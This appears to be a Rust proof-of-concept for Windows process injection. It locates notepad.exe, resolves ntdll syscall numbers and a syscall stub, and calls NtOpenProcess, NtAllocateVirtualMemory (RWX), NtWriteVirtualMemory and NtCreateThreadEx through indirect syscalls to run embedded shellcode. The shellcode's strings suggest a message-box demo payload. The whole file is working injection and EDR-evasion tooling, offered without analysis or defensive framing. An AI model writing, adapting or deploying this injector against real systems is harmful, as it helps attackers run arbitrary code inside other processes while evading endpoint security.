#![allow(non_snake_case)]
use std::ffi::CString;
use std::mem;
use std::ptr::null_mut;
use ntapi::ntapi_base::CLIENT_ID;
use ntapi::ntpsapi::PPS_ATTRIBUTE_LIST;
use winapi::ctypes::c_void;
use winapi::shared::basetsd::{PSIZE_T, SIZE_T};
use winapi::shared::ntdef::{BOOLEAN, NTSTATUS, OBJECT_ATTRIBUTES, PLARGE_INTEGER, POBJECT_ATTRIBUTES};
// use winapi::shared::minwindef::{DWORD, FALSE};
use winapi::shared::ntstatus::STATUS_SUCCESS;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::libloaderapi::GetModuleHandleW;
// use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
// use winapi::um::processthreadsapi::{CreateRemoteThread, OpenProcess};
use winapi::um::handleapi::CloseHandle;
// use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};
use winapi::um::winnt::{ACCESS_MASK, HANDLE, MEMORY_BASIC_INFORMATION, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};


fn get_pid(process_name: &str) -> u32{
    unsafe{
        let mut pe: PROCESSENTRY32 = std::mem::zeroed();
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;

        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap.is_null(){
            println!("Error while snapshoting processes : Error : {}",GetLastError());
            std::process::exit(0);
        }

        let mut pid = 0;

        let mut result = Process32First(snap, &mut pe) != 0;

        while result{

            let exe_file = CString::from_vec_unchecked(pe.szExeFile
                .iter()
                .map(|&file| file as u8)
                .take_while(|&c| c!=0)
                .collect::<Vec<u8>>(),
            );

            if exe_file.to_str().unwrap() == process_name {
                pid = pe.th32ProcessID;
                break;
            }
            result = Process32Next(snap, &mut pe) !=0;
        }

        if pid == 0{
            println!("Unable to get PID for {}: {}",process_name , "PROCESS DOESNT EXISTS");           
            std::process::exit(0);
        }
    
        CloseHandle(snap);
        pid
    }
}


extern "C" {
    fn GetProcAddress(hModule: HANDLE, lpProcName: *const u8) -> usize;
}


// Helper function to find syscall number by looking for mov eax, imm32 pattern
unsafe fn find_syscall_number(func_address: usize) -> Option<u32> {
    let mut i = 0;
    while i < 32 { // Arbitrary limit to search within the first few bytes
        if *(func_address as *const u8).offset(i) == 0xB8 { // 'mov eax, imm32'
            return Some(*(func_address as *const u32).offset(i + 1));
        }
        i += 1;
    }
    None
}

unsafe fn resolve_nt_syscall(function_name: &str) -> Option<(u32, usize)> {
    let ntdll = GetModuleHandleW("ntdll.dll\0".encode_utf16().collect::<Vec<u16>>().as_ptr());
    if ntdll.is_null() {
        println!("Unable to get ntdll module");
        return None;
    }

    let func_address = GetProcAddress(ntdll as _, function_name.as_ptr());
    if func_address == 0 {
        println!("Unable to get function address for {}", function_name);
        return None;
    }

    // Parse the syscall number and address
//     let ssn = *(func_address as *const u8).offset(4) as u32;
//     let syscall_address = func_address + 0x12;
//     Some((ssn, syscall_address))
    if let Some(ssn) = find_syscall_number(func_address) {
        // Find a known syscall instruction in ntdll.dll
        // Here we're assuming any syscall will do; in practice, you might want to use the exact one
        let syscall_stub = find_syscall_stub(ntdll as *mut c_void);
        if syscall_stub.is_null() {
            println!("Failed to locate syscall stub");
            return None;
        }
        Some((ssn, syscall_stub as usize))
    } else {
        println!("Failed to resolve syscall number for {}", function_name);
        None
    }
}

const SYSCALL_OPCODE: u16 = 0x050F; // 0F 05 in little-endian

unsafe fn find_syscall_stub(ntdll: HANDLE) -> *mut u8 {
    let ntdll_base = ntdll as *mut u8;
    
    // Get the size of ntdll.dll in memory
    let mut ntdll_size = 0;
    let mut ntdll_info: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
    let mut current_address = ntdll_base;
    while VirtualQuery(current_address as *const _, &mut ntdll_info, std::mem::size_of::<MEMORY_BASIC_INFORMATION>()) != 0 {
        if ntdll_info.AllocationBase == ntdll_base as *mut c_void{
            ntdll_size += ntdll_info.RegionSize;
        } else {
            break;
        }
        current_address = current_address.add(ntdll_info.RegionSize);
    }

    // Scan for the syscall instruction
    for i in 0..(ntdll_size - 1) {
        let current_byte = ntdll_base.offset(i as isize);
        if *(current_byte as *const u16) == SYSCALL_OPCODE {
            return current_byte as *mut u8;
        }
    }

    // If no syscall instruction is found, return null
    null_mut()
}

// Helper functions needed for the above code
// use winapi::um::memoryapi::{VirtualQuery, MEMORY_BASIC_INFORMATION};

// Make sure to link against these libraries for Windows API calls
#[link(name = "kernel32")]
extern "system" {
    fn VirtualQuery(lpAddress: *const std::ffi::c_void, lpBuffer: *mut MEMORY_BASIC_INFORMATION, dwLength: usize) -> usize;
}



unsafe fn indirect_syscall_injector(payload: &[u8], pid: u32) -> bool {
    // Resolve syscalls
    let nt_open_process = resolve_nt_syscall("NtOpenProcess\0").unwrap();
    let nt_allocate_virtual_memory = resolve_nt_syscall("NtAllocateVirtualMemory\0").unwrap();
    let nt_write_virtual_memory = resolve_nt_syscall("NtWriteVirtualMemory\0").unwrap();
    let nt_create_thread_ex = resolve_nt_syscall("NtCreateThreadEx\0").unwrap();
    let nt_wait_for_single_object = resolve_nt_syscall("NtWaitForSingleObject\0").unwrap();
    let nt_close = resolve_nt_syscall("NtClose\0").unwrap();

    let mut oa: OBJECT_ATTRIBUTES = mem::zeroed();
    let mut cid: CLIENT_ID = mem::zeroed();
    cid.UniqueProcess = pid as *mut c_void;

    // Create an indirect syscall for NtOpenProcess
    let syscall: unsafe extern "system" fn(
        *mut *mut c_void, 
        ACCESS_MASK, 
        *mut OBJECT_ATTRIBUTES, 
        *mut CLIENT_ID, 
    ) -> NTSTATUS = mem::transmute(nt_open_process.1);

    let mut h_process: HANDLE = null_mut();
    let status = syscall(
        &mut h_process as *mut *mut c_void,
        PROCESS_ALL_ACCESS,
        &mut oa,
        &mut cid,
    );

    if status != STATUS_SUCCESS {
        eprintln!("NtOpenProcess failed with status: 0x{:x}", status);
        return false;
    }

    let syscall_alloc: unsafe extern "system" fn(
        *mut c_void,
        *mut *mut c_void,
        usize,
        *mut SIZE_T,
        u32,
        u32,
    ) -> NTSTATUS = mem::transmute(nt_allocate_virtual_memory.1);

    let mut alloc_size: SIZE_T = 4096;
    let mut r_buffer: *mut c_void = null_mut();
    let status = syscall_alloc(
        h_process,
        &mut r_buffer,
        0,
        &mut alloc_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE,
    );


    if status != STATUS_SUCCESS {
        eprintln!("NtAllocateVirtualMemory failed with status: 0x{:x}", status);
        CloseHandle(h_process);
        return false;
    }

    // write payload to allocated memory !

    let mut bytes_written: SIZE_T = 0;

    let syscall: unsafe extern "system" fn(
        *mut c_void, // HANDLE
        *mut c_void, // PVOID
        *mut c_void, // pvoid
        SIZE_T,
        PSIZE_T,
    ) -> NTSTATUS = std::mem::transmute(nt_write_virtual_memory.1);

    let status = syscall(
        h_process,
        r_buffer,
        payload.as_ptr() as _,
        payload.len(),
        &mut bytes_written,
    );

    if status != STATUS_SUCCESS {
        eprintln!("NtWriteVirtualMemory failed with status: 0x{:x}", status);
        CloseHandle(h_process);
        return false;
    }

    let mut h_thread: HANDLE = null_mut();
    // nt_create_thread_ex
    let syscall: unsafe extern "system" fn(
        *mut *mut c_void, // PHANDLE -> * -> *
        ACCESS_MASK, // U32
        POBJECT_ATTRIBUTES,
        *mut c_void,
        *mut c_void,
        *mut c_void,
        u32,
        SIZE_T,
        SIZE_T,
        SIZE_T,
        PPS_ATTRIBUTE_LIST,
    ) -> NTSTATUS = std::mem::transmute(nt_create_thread_ex.1);

    let status = syscall(
        &mut h_thread,
        winapi::um::winnt::THREAD_ALL_ACCESS,
        null_mut(),
        h_process,
        r_buffer,
        null_mut(),
        0,
        0,
        0,
        0,
        null_mut(),
    );

    if status != STATUS_SUCCESS {
        eprintln!("NtCreateThreadEx failed with status: 0x{:x}", status);
        CloseHandle(h_process);
        return false;
    }

    // let use new NtWaitForSingleObject !
    let syscall: unsafe extern "system" fn(
        *mut c_void,
        BOOLEAN,
        PLARGE_INTEGER,
    ) -> NTSTATUS = std::mem::transmute(nt_wait_for_single_object.1);

    let status = syscall(
        h_thread, 0, null_mut()
    );

    if status != STATUS_SUCCESS {
        eprintln!("NtWaitForSingleObject failed with status: 0x{:x}", status);
        CloseHandle(h_process);
        return false;
    }
    // WaitForSingleObject(h_thread, 0xFFFFFFFF);
    let NtCloseHandle: unsafe extern "system" fn(
        *mut c_void
    ) -> NTSTATUS = std::mem::transmute(nt_close.1);

    NtCloseHandle(h_thread);
    NtCloseHandle(h_process);
    true
}

pub fn execute(){
    let payload: [u8; 328] = [0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,
    0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
    0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,
    0x52,0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,
    0x3e,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,
    0x3e,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,
    0x00,0x00,0x48,0x85,0xc0,0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,
    0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,
    0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
    0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0x38,0xe0,0x75,0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,
    0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,0x40,0x24,0x49,
    0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,
    0x1c,0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,
    0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,
    0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,
    0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x3e,
    0x48,0x8d,0x8d,0x30,0x01,0x00,0x00,0x41,0xba,0x4c,0x77,0x26,
    0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,
    0x8d,0x95,0x0e,0x01,0x00,0x00,0x3e,0x4c,0x8d,0x85,0x24,0x01,
    0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,
    0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5,
    0x48,0x65,0x79,0x20,0x6d,0x61,0x6e,0x2e,0x20,0x49,0x74,0x73,
    0x20,0x6d,0x65,0x20,0x53,0x6d,0x75,0x6b,0x78,0x00,0x6b,0x6e,
    0x6f,0x63,0x6b,0x2d,0x6b,0x6e,0x6f,0x63,0x6b,0x00,0x75,0x73,
    0x65,0x72,0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00];

    let process_name = "notepad.exe";
    let pid = get_pid(&process_name);

    println!("PID of {}:{}", process_name, pid);

    unsafe{
        if !indirect_syscall_injector(&payload, pid){
            eprintln!("Injection Failed");
        }else{
            println!("Injection Success");
        }
    }
}

